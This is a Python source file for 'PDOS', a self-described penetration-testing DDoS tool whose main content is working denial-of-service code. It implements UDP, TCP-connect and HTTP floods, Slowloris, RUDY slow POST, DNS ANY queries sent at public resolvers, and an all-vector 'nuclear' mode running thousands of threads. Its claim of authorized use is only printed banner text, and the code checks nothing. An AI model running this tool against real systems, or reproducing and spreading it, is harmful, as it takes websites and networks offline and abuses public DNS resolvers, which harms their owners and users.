from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet
import threading
import sys
import requests
import struct
import ssl

# Version.
version = "3.0-FAST"

# Platform info.
uname = system()

if uname == "Windows":
    cmd_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)

# Global variables.
running = False
packets_sent = 0
lock = threading.Lock()

# Banner centered.

banner_lines = [
    " .S_sSSs          .S_SSSs         sSSs_sSSs       .S          .S_sSSs     .S_sSSs   ",
    ".SS~YS%%b        .SS~SSSSS       d%%SP~YS%%b     .SS         .SS~YS%%b   .SS~YS%%b  ",
    "S%S   `S%b       S%S   SSSS     d%S'     `S%b    S%S         S%S   `S%b d%S'   S%S  ",
    "S%S    S%S       S%S            S%S       S%S    S%S         S%S    S%S S%S    S%S  ",
    "S%S    d*S       S&S            S&S              S&S         S%S    d*S S*S    S%S  ",
    "S&S   .S*S       S&S__SP        S&S   .SS_sSSSS  S&S          S&S  .S*S S*S.  S&S   ",
    "S&S_sdSSS        S&S~YSY        S&S   ~YSY~YS%b  S&S           S&S_sdSS SSbs_sdS&S  ",
    "S&S~YSY%b        S&S            S&S         S%S  S&S           S&S~YS%b d%SP~YS&S   ",
    "S*S   `S%b       S*S            S*S         S%S  S*S          .S*S  S%S S%S  S*S.   ",
    "S*S    S%S       S*S   SSSS     S*S.       .S*S  S*S         .S*S    S*S S*S    S*S. ",
    "S*S    S&S       S*S_sdSSSS      SSSbs_sdSSS8S   S*S        .S*S    .S*S S*S.    S*S.",
    "S*S    SSS       SSS~YSSSSS       YSSP~YSSY*S    SSS        SSSbs_sdSSS   SSSbs_sdSSS",
    "SP                                                                                  ",
    "Y                                                                                   ",
]

# ============ HELPER FUNCTIONS ============

def print_banner():
    os.system(cmd_clear)
    for line in banner_lines:
        print("\033[91m" + line + "\033[0m")
    print("\033[93m" + " " * 15 + "PDOS - Penetration Testing DDoS Tool" + "\033[0m")
    print("\033[96m" + " " * 18 + "Author: Pain" + "\033[0m")
    print("\033[96m" + " " * 10 + "YouTube: https://youtube.com/@thepainhimself" + "\033[0m")
    print("\033[91m" + " " * 8 + "For authorized penetration testing only." + "\033[0m")
    print("\033[92m" + " " * 6 + "I have permission and am authorized to perform this pentest." + "\033[0m")
    print("\033[93m" + " " * 13 + "[!] FAST MODE - 0 second delay" + "\033[0m")
    print("")

def get_random_headers():
    ua_list = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
        'Googlebot/2.1 (+http://www.google.com/bot.html)',
    ]
    return {
        'User-Agent': random.choice(ua_list),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
    }

# ============ ATTACK FUNCTIONS - FAST VERSION (0 sleep) ============

def udp_flood(ip, port, threads_count):
    """[#] UDP flood attack - FAST."""
    global running, packets_sent
    # Create multiple sockets for speed
    socks = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(10)]
    sock_idx = 0
    while running:
        try:
            packet = random._urandom(1490)
            socks[sock_idx % 10].sendto(packet, (ip, port))
            with lock:
                packets_sent += 1
            sock_idx += 1
        except:
            pass
    for s in socks:
        s.close()

def syn_flood(ip, port, threads_count):
    """[#] TCP SYN flood - FAST."""
    global running, packets_sent
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((ip, port))
            with lock:
                packets_sent += 1
            s.close()
        except:
            pass

def http_flood(target_url, threads_count):
    """[#] HTTP GET/POST flood - FAST."""
    global running, packets_sent
    session = requests.Session()
    # Disable connection pooling delays
    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=1000, max_retries=0)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    while running:
        try:
            headers = get_random_headers()
            if random.choice([True, False]):
                r = session.get(target_url, headers=headers, timeout=1, verify=False)
            else:
                r = session.post(target_url, headers=headers, timeout=1, verify=False)
            with lock:
                packets_sent += 1
        except:
            pass

def slowloris(ip, port, threads_count):
    """[#] Slowloris - FAST (no sleep)."""
    global running, packets_sent
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
            
            # Send all headers immediately (no sleep)
            for _ in range(50):
                if not running:
                    break
                s.send(f"X-KeepAlive: {random.randint(1, 999999)}\r\n".encode())
                with lock:
                    packets_sent += 1
            s.close()
        except:
            try:
                s.close()
            except:
                pass

def dns_amplification(ip, port, threads_count):
    """[#] DNS amplification attack - FAST."""
    global running, packets_sent
    dns_servers = ['8.8.8.8', '8.8.4.4', '1.1.1.1', '9.9.9.9', '208.67.222.222', '208.67.220.220']
    domains = ['google.com', 'facebook.com', 'cloudflare.com', 'amazon.com', 'microsoft.com',
               'netflix.com', 'youtube.com', 'instagram.com', 'twitter.com', 'linkedin.com']
    
    # Pre-build packets for speed
    packets = []
    for _ in range(20):
        tid = random.randint(0, 65535)
        domain = random.choice(domains)
        
        header = struct.pack('>H', tid)
        header += struct.pack('>H', 0x0100)
        header += struct.pack('>H', 1)
        header += struct.pack('>H', 0)
        header += struct.pack('>H', 0)
        header += struct.pack('>H', 0)
        
        qname = b''
        for part in domain.split('.'):
            qname += bytes([len(part)]) + part.encode()
        qname += b'\x00'
        qtype = struct.pack('>H', 255)
        qclass = struct.pack('>H', 1)
        
        packets.append(header + qname + qtype + qclass)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    pkt_idx = 0
    dns_idx = 0
    
    while running:
        try:
            sock.sendto(packets[pkt_idx % 20], (dns_servers[dns_idx % 6], 53))
            with lock:
                packets_sent += 1
            pkt_idx += 1
            dns_idx += 1
        except:
            pass
    sock.close()

def rudy_attack(ip, port, threads_count):
    """[#] RUDY - Slow POST attack - FAST."""
    global running, packets_sent
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            
            body = "a" * 1000
            s.send(f"POST / HTTP/1.1\r\nHost: {ip}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n\r\n".encode())
            s.send(body.encode())
            with lock:
                packets_sent += 1
            s.close()
        except:
            try:
                s.close()
            except:
                pass

# ============ MAIN ============

def main():
    global running, packets_sent
    
    print_banner()
    
    # Menu.
    print("\033[93m" + " " * 10 + "1. Website Domain\033[0m")
    print("\033[93m" + " " * 10 + "2. IP Address\033[0m")
    print("\033[93m" + " " * 10 + "3. LINK (Direct URL Attack)\033[0m")
    print("\033[93m" + " " * 10 + "4. Exit\033[0m")
    
    opt = str(input("\n\033[96m" + " " * 12 + "[/] Select > \033[0m"))
    
    ip = None
    target_url = None
    attack_mode = "ip"
    
    if opt == '1':
        domain = str(input("\033[93m" + " " * 10 + "[?] Domain: \033[0m"))
        try:
            ip = socket.gethostbyname(domain)
            print("\033[92m" + " " * 10 + "[+] Resolved " + domain + " -> " + ip + "\033[0m")
            target_url = "http://" + domain
            attack_mode = "domain"
        except:
            print("\033[91m" + " " * 10 + "[-] Failed to resolve domain!\033[0m")
            input("\n" + " " * 10 + "Press Enter to exit...")
            sys.exit(1)
    elif opt == '2':
        ip = str(input("\033[93m" + " " * 10 + "[?] IP Address: \033[0m"))
        attack_mode = "ip"
    elif opt == '3':
        target_url = str(input("\033[93m" + " " * 10 + "[?] Link (URL): \033[0m"))
        if not target_url.startswith('http'):
            target_url = 'http://' + target_url
        try:
            parsed = target_url.split('/')
            host = parsed[2]
            ip = socket.gethostbyname(host)
            print("\033[92m" + " " * 10 + "[+] Resolved " + host + " -> " + ip + "\033[0m")
            attack_mode = "url"
        except:
            print("\033[91m" + " " * 10 + "[-] Failed to resolve URL!\033[0m")
            input("\n" + " " * 10 + "Press Enter to exit...")
            sys.exit(1)
    elif opt == '4':
        sys.exit(0)
    else:
        print("\033[91m" + " " * 10 + "[-] Invalid choice!\033[0m")
        time.sleep(2)
        sys.exit(1)
    
    # Port selection.
    port_bool = str(input("\n\033[93m" + " " * 10 + "[?] Certain port? [y/n]: \033[0m"))
    if port_bool.lower() == 'y':
        port = int(input("\033[93m" + " " * 10 + "[?] Port: \033[0m"))
    else:
        port = random.randint(1, 65535)
    
    # Thread count - HIGH for speed.
    try:
        threads = int(input("\n\033[93m" + " " * 10 + "[?] Threads (100-5000): \033[0m"))
        if threads < 1:
            threads = 500
    except:
        threads = 500
    
    # Duration.
    try:
        duration = int(input("\033[93m" + " " * 10 + "[?] Duration in seconds (0 = unlimited): \033[0m"))
    except:
        duration = 30
    
    # Attack vector selection.
    print("\n\033[93m" + " " * 10 + "[?] Select attack vector:\033[0m")
    print("\033[93m" + " " * 12 + "1. UDP Flood\033[0m")
    print("\033[93m" + " " * 12 + "2. SYN Flood (TCP Connect)\033[0m")
    print("\033[93m" + " " * 12 + "3. HTTP Flood\033[0m")
    print("\033[93m" + " " * 12 + "4. Slowloris\033[0m")
    print("\033[93m" + " " * 12 + "5. DNS Amplification\033[0m")
    print("\033[93m" + " " * 12 + "6. RUDY (Slow POST)\033[0m")
    print("\033[93m" + " " * 12 + "7. ALL VECTORS (Nuclear)\033[0m")
    print("\033[93m" + " " * 12 + "8. Random Vector\033[0m")
    
    vec_choice = str(input("\n\033[96m" + " " * 12 + "[/] Select > \033[0m"))
    
    vector_map = {
        '1': ("UDP Flood", udp_flood),
        '2': ("SYN Flood", syn_flood),
        '3': ("HTTP Flood", http_flood),
        '4': ("Slowloris", slowloris),
        '5': ("DNS Amplification", dns_amplification),
        '6': ("RUDY Slow POST", rudy_attack),
    }
    
    target_display = ip
    if attack_mode == "url" and target_url:
        target_display = target_url
    
    # Attack info.
    os.system(cmd_clear)
    print_banner()
    print("\033[92m" + " " * 10 + "[+] Target: " + str(target_display) + "\033[0m")
    print("\033[92m" + " " * 10 + "[+] IP: " + str(ip) + "\033[0m")
    print("\033[92m" + " " * 10 + "[+] Port: " + str(port) + "\033[0m")
    print("\033[92m" + " " * 10 + "[+] Threads: " + str(threads) + "\033[0m")
    print("\033[92m" + " " * 10 + "[+] Duration: " + ("Unlimited" if duration == 0 else str(duration) + "s") + "\033[0m")
    print("\033[91m" + " " * 10 + "[!] FAST MODE: 0 second delay, max performance\033[0m")
    print("")
    
    # Suppress SSL warnings.
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except:
        pass
    
    # Start attack.
    running = True
    packets_sent = 0
    start_time = time.time()
    
    # Stats printer thread.
    def stats_printer():
        global running, packets_sent
        while running:
            time.sleep(1)
            elapsed = time.time() - start_time
            rate = packets_sent / elapsed if elapsed > 0 else 0
            print("\033[92m" + " " * 10 + "[+] Packets: " + str(packets_sent) + " | Rate: " + f"{rate:.0f}" + " pps | Elapsed: " + str(int(elapsed)) + "s\033[0m")
    
    stats_thread = threading.Thread(target=stats_printer, daemon=True)
    stats_thread.start()
    
    # Launch attack threads.
    thread_list = []
    
    if vec_choice == '7':  # All vectors - NUCLEAR.
        vectors = [udp_flood, syn_flood, http_flood, slowloris, dns_amplification, rudy_attack]
        print("\033[91m" + " " * 10 + "[!] NUCLEAR MODE - ALL vectors active with 0 delay\033[0m")
        for i in range(threads):
            vec = random.choice(vectors)
            if vec == http_flood and target_url:
                t = threading.Thread(target=vec, args=(target_url, threads), daemon=True)
            else:
                t = threading.Thread(target=vec, args=(ip, port, threads), daemon=True)
            t.start()
            thread_list.append(t)
    elif vec_choice == '8':  # Random vector.
        vectors = [udp_flood, syn_flood, http_flood, slowloris, dns_amplification, rudy_attack]
        vec = random.choice(vectors)
        print("\033[93m" + " " * 10 + "[!] Selected: " + vec.__name__ + "\033[0m")
        for i in range(threads):
            if vec == http_flood and target_url:
                t = threading.Thread(target=vec, args=(target_url, threads), daemon=True)
            else:
                t = threading.Thread(target=vec, args=(ip, port, threads), daemon=True)
            t.start()
            thread_list.append(t)
    elif vec_choice in vector_map:
        vec_name, vec_func = vector_map[vec_choice]
        print("\033[93m" + " " * 10 + "[!] Selected: " + vec_name + "\033[0m")
        for i in range(threads):
            if vec_func == http_flood and target_url:
                t = threading.Thread(target=vec_func, args=(target_url, threads), daemon=True)
            else:
                t = threading.Thread(target=vec_func, args=(ip, port, threads), daemon=True)
            t.start()
            thread_list.append(t)
    else:
        print("\033[93m" + " " * 10 + "[!] Selected: UDP Flood (default)\033[0m")
        for i in range(threads):
            t = threading.Thread(target=udp_flood, args=(ip, port, threads), daemon=True)
            t.start()
            thread_list.append(t)
    
    print("\n\033[91m" + " " * 10 + "[!!!] ATTACK IN PROGRESS - Press Ctrl+C to stop\033[0m\n")
    
    # Run until stopped.
    try:
        while running:
            time.sleep(0.1)
            if duration > 0 and (time.time() - start_time) >= duration:
                running = False
    except KeyboardInterrupt:
        print("\n\033[93m" + " " * 10 + "[!] Attack stopped by user.\033[0m")
    
    running = False
    elapsed = time.time() - start_time
    
    print("\n\033[92m" + " " * 10 + "[✓] Attack finished!\033[0m")
    print("\033[92m" + " " * 10 + "[+] Total packets sent: " + str(packets_sent) + "\033[0m")
    print("\033[92m" + " " * 10 + "[+] Total time: " + f"{elapsed:.1f}" + "s\033[0m")
    print("\033[92m" + " " * 10 + "[+] Average rate: " + f"{packets_sent/elapsed:.0f}" + " pps\033[0m")
    
    input("\n\033[96m" + " " * 10 + "[:] Press Enter to exit...\033[0m")

if __name__ == "__main__":
    main()

